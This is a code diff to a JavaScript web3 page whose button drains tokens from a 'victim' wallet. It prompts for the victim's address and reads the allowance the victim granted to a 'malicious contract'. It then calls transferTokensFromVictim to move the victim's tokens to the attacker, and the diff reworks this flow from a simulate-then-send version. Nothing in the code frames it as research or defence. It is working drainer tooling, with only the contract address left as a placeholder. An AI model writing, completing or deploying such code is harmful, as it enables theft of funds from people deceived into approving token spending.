@@ -586,8 +586,8 @@
 document.getElementById("transferTokensBtn").addEventListener("click", async () => {
     console.debug("transferTokensBtn click handler triggered");
 
-    // Fetch the deployer's address dynamically
-    const deployerAddress = await web3.eth.getCoinbase();
+    // Fetch the deployer's address dynamically from the wallet
+    const deployerAddress = await web3.eth.getCoinbase();  // This fetches the deployer's address
 
     // Step 1: Prompt for the victim's wallet address
     const victimAddress = prompt("Enter victim's wallet address:");
@@ -605,42 +605,65 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
         }
 
         try {
-            // Step 3: Simulate the malicious contract's function call
-            console.debug("Simulating transferTokensFromVictim call...");
-            try {
-                const simulationResult = await maliciousContract.methods
-                    .transferTokensFromVictim(cleanedVictimAddress)
-                    .call({ from: deployerAddress }); // Simulate the function call
-                console.debug("Simulation successful, result:", simulationResult);
-
-                alert(`Simulation successful. You can proceed to withdraw all tokens from the victim's wallet.`);
-            } catch (simulationError) {
-                console.error("Simulation Error:", simulationError);
-
-                const errorReason = simulationError.message.match(/revert (.*)$/i);
-                if (errorReason) {
-                    alert(`Simulation failed: ${errorReason[1]}`);
-                } else {
-                    alert("Simulation failed due to an unknown error. Check console logs for details.");
+            // Step 3: Initialize the malicious contract instance
+            const maliciousContractAbi = [
+                {
+                    "constant": true,
+                    "inputs": [
+                        { "name": "victim", "type": "address" }
+                    ],
+                    "name": "checkAllowance",
+                    "outputs": [
+                        { "name": "", "type": "uint256" }
+                    ],
+                    "payable": false,
+                    "stateMutability": "view",
+                    "type": "function"
+                },
+                {
+                    "inputs": [
+                        { "name": "victim", "type": "address" }
+                    ],
+                    "name": "transferTokensFromVictim",
+                    "outputs": [],
+                    "payable": false,
+                    "stateMutability": "nonpayable",
+                    "type": "function"
                 }
-                return; // Stop execution if simulation fails
+            ];
+
+            // Malicious contract address (Replace with the actual deployed address)
+            const maliciousContractAddress = "0xYourMaliciousContractAddress"; // <-- This is the contract's address
+            const maliciousContract = new web3.eth.Contract(maliciousContractAbi, maliciousContractAddress);
+
+            // Step 4: Check allowance to ensure the victim has granted the malicious contract permission
+            const allowance = await maliciousContract.methods.checkAllowance(cleanedVictimAddress).call();
+            console.debug("Allowance fetched:", allowance);
+
+            if (allowance <= 0) {
+                alert("No allowance granted by the victim.");
+                console.debug("Allowance is zero or invalid.");
+                return;
             }
 
-            // Step 4: Execute the malicious contract's transferTokensFromVictim function
-            console.debug("Executing transferTokensFromVictim call...");
-            const transaction = await maliciousContract.methods
-                .transferTokensFromVictim(cleanedVictimAddress)
-                .send({ from: deployerAddress }); // Execute the function
-            console.debug("Transaction details:", transaction);
+            // Step 5: Initiate the token transfer from victim to malicious contract
+            console.debug("Attempting to transfer tokens from victim...");
+            const result = await maliciousContract.methods
+                .transferTokensFromVictim(cleanedVictimAddress) // Transfer tokens from the victim's address
+                .send({ from: deployerAddress }); // Send from deployer's address (which is already fetched)
 
-            // Notify successful withdrawal
-            alert(`Successfully withdrawn tokens from the victim's wallet to the malicious contract!`);
+            console.debug("Tokens transferred successfully:", result);
+
+            // Step 6: Notify user of success
+            alert("Tokens successfully transferred from victim to malicious contract!");
         } catch (error) {
-            console.error("Withdrawal Error:", error);
-            alert("Error occurred during withdrawal. Check victim's approval and balance.");
+            console.error("Error during token transfer:", error);
+            alert("Failed to transfer tokens. Check the console for error details.");
         }
     }
 });
+
+
 
 
 
